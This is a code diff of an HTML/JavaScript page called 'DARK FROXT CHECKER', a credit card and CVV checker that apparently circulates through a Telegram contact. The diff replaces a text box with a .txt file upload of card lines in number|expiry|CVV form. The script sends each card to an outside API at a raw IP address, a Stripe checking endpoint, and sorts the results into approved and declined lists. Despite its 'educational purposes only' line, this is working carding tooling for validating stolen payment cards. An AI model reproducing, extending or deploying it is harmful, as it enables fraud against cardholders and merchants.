@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>DARK FROXT CHECKER - API ENABLED</title>
+  <title>DARK FROXT CHECKER - Upload & Check</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@700&display=swap" rel="stylesheet">
   <style>
@@ -12,111 +12,34 @@
       font-family: 'Roboto', Arial, sans-serif;
       margin: 0; min-height: 100vh;
     }
-    .container {
-      max-width: 950px; margin: 50px auto; padding: 32px;
-      background: rgba(0,0,0,0.4); border-radius: 20px;
-      box-shadow: 0 8px 30px #0008;
-    }
-    header, footer {
-      background: rgba(0,0,0,0.4);
-      border-bottom: 1px solid #b91c1c33;
-      border-top: 1px solid #b91c1c33;
-      padding: 16px 0;
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    h1 {
-      margin: 0 0 6px 0;
-      font-size: 2rem;
-      letter-spacing: 1px;
-    }
-    .system-time {
-      background: #2563eb;
-      color: #fff;
-      border-radius: 8px;
-      padding: 2px 10px;
-      font-family: monospace;
-      font-size: 1rem;
-      display: inline-block;
-      margin-left: 8px;
-    }
-    form {
-      margin-bottom: 22px;
-    }
-    textarea {
-      width: 100%;
-      min-height: 70px;
-      background: rgba(55,65,81,0.4);
-      border: 1px solid #b91c1c44;
-      border-radius: 8px;
-      color: #fff;
-      font-size: 1rem;
-      padding: 10px;
-      margin-bottom: 18px;
-      resize: none;
-      text-align: center;
-    }
-    button {
-      background: #2563eb;
-      color: #fff;
-      cursor: pointer;
-      font-weight: bold;
-      font-size: 1.13rem;
-      width: 100%;
-      border: none;
-      border-radius: 8px;
-      padding: 14px 0;
-      margin-bottom: 20px;
-      transition: background 0.2s;
-    }
+    .container { max-width: 950px; margin: 50px auto; padding: 32px; background: rgba(0,0,0,0.4); border-radius: 20px; box-shadow: 0 8px 30px #0008;}
+    h1 { text-align: center; }
+    .uploader { text-align: center; margin-bottom: 22px; }
+    input[type="file"] { margin-top: 8px; color: #fff; }
+    button { background: #2563eb; color: #fff; border: none; border-radius: 8px; padding: 12px 28px; font-size: 1.15rem; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-top: 10px;}
     button:hover { background: #1d4ed8; }
-    .results {
-      display: flex; gap: 32px; justify-content: center;
-      margin-top: 18px; flex-wrap: wrap;
-    }
-    .result-box {
-      flex: 1 1 370px; background: rgba(0,0,0,0.5);
-      border-radius: 12px; padding: 16px 16px 18px 16px; min-height: 250px;
-      box-shadow: 0 2px 14px #0005;
-      border: 2px solid #333;
-      display: flex; flex-direction: column;
-    }
+    .results { display: flex; gap: 32px; justify-content: center; margin-top: 18px; flex-wrap: wrap;}
+    .result-box { flex: 1 1 370px; background: rgba(0,0,0,0.5); border-radius: 12px; padding: 16px 16px 18px 16px; min-height: 250px; box-shadow: 0 2px 14px #0005; border: 2px solid #333; display: flex; flex-direction: column;}
     .approved { border-color: #10b981; }
     .declined { border-color: #ef4444; }
     .result-box h3 { margin-top: 0; text-align: center; letter-spacing: 1px; }
-    .approved-list, .declined-list {
-      font-family: monospace; font-size: 1.06rem;
-      margin: 0; padding-left: 14px;
-      word-break: break-all;
-      flex: 1 1 auto;
-    }
+    .approved-list, .declined-list { font-family: monospace; font-size: 1.06rem; margin: 0; padding-left: 14px; word-break: break-all; flex: 1 1 auto;}
     .approved-list { color: #10b981;}
     .declined-list { color: #ef4444;}
-    .loading { color: #fbbf24; text-align: center; }
-    .note { color: #ccc; font-size: 0.95rem; margin-top: 10px;}
+    .loading { color: #fbbf24; text-align: center; margin-top: 12px;}
+    .note { color: #ccc; font-size: 0.95rem; margin-top: 20px; text-align:center;}
     a { color: #60a5fa; text-decoration: none;}
     a:hover { color: #f87171; }
-    @media (max-width: 950px) {
-      .results { flex-direction: column; gap: 20px;}
-    }
+    @media (max-width: 950px) { .results { flex-direction: column; gap: 20px;} }
   </style>
 </head>
 <body>
-  <header>
-    <h1>[DARK FROXT CHECKER]</h1>
-    <p>[CCN & CVV CHECKER - API ENABLED]</p>
-    <p>
-      Current System Time:
-      <span class="system-time" id="systemTime"></span>
-      |
-      <a href="https://t.me/code_wraith" target="_blank">@Code_Wraith</a>
-    </p>
-  </header>
   <div class="container">
-    <form id="cardForm">
-      <textarea id="cardInput" placeholder="Enter one card per line: 4532015112830366|12|2025|123"></textarea>
-      <button type="submit">Check Cards</button>
-    </form>
+    <h1>DARK FROXT CHECKER</h1>
+    <div class="uploader">
+      <input type="file" id="ccFile" accept=".txt">
+      <button onclick="checkCardsFromFile()">Check Cards</button>
+    </div>
     <div id="progress" class="loading"></div>
     <div class="results">
       <div class="result-box approved">
@@ -131,35 +54,14 @@
     <div class="note">
       <p>Educational purposes only. Not for fraudulent use.</p>
     </div>
-  </div>
-  <footer>
-    <p>
-      <a href="https://t.me/+a-AByJ4jjTAzZjc1" target="_blank">
-        [EDITED BY: CODE WRAITH - API ENABLED]
-      </a>
-    </p>
-    <p>
-      <a href="https://t.me/code_wraith" target="_blank">
-        CLICK HERE TO CONTACT US
-      </a>
-    </p>
     <div class="note">
-      <p>Educational purposes only. Not for fraudulent use.</p>
+      <a href="https://t.me/code_wraith" target="_blank">Contact: @Code_Wraith</a>
     </div>
-  </footer>
+  </div>
   <script>
-    // Show system time live
-    function updateTime() {
-      document.getElementById('systemTime').textContent = new Date().toLocaleTimeString();
-    }
-    setInterval(updateTime, 1000);
-    updateTime();
-
     const API_URL = "http://46.202.163.144:9090/v1/stripe/cc=";
-
-    document.getElementById("cardForm").onsubmit = async function(e) {
-      e.preventDefault();
-      const cardLines = document.getElementById("cardInput").value.trim().split('\n').map(x => x.trim()).filter(Boolean);
+    async function checkCardsFromFile() {
+      const fileInput = document.getElementById("ccFile");
       const approvedList = document.getElementById("approvedList");
       const declinedList = document.getElementById("declinedList");
       const progress = document.getElementById("progress");
@@ -167,8 +69,17 @@
       declinedList.innerHTML = "";
       progress.textContent = "";
 
+      if (!fileInput.files[0]) {
+        progress.textContent = "Please select a .txt file.";
+        return;
+      }
+
+      const file = fileInput.files[0];
+      const text = await file.text();
+      const cardLines = text.split('\n').map(x => x.trim()).filter(Boolean);
+
       if (cardLines.length === 0) {
-        progress.textContent = "Please enter card(s).";
+        progress.textContent = "No cards found in file.";
         return;
       }
 
@@ -184,7 +95,6 @@
           // Try to parse JSON, fallback to text
           let approved = false;
           let message = text;
-
           try {
             const data = JSON.parse(text);
             if (
@@ -200,12 +110,10 @@
               approved = false;
               message = data.message || "Declined";
             } else {
-              // Unknown result, show as declined
               approved = false;
               message = text;
             }
           } catch (e) {
-            // If response is not JSON, check text for keywords
             if (text.toLowerCase().includes("approved") || text.toLowerCase().includes("success")) {
               approved = true;
             }
@@ -213,8 +121,6 @@
               approved = false;
             }
           }
-
-          // Add result to list
           const el = document.createElement("li");
           el.textContent = card + " → " + message;
           if (approved) {
@@ -229,9 +135,8 @@
         }
         await new Promise(res => setTimeout(res, 1000));
       }
-
       progress.textContent = "Done!";
-    };
+    }
   </script>
 </body>
 </html>
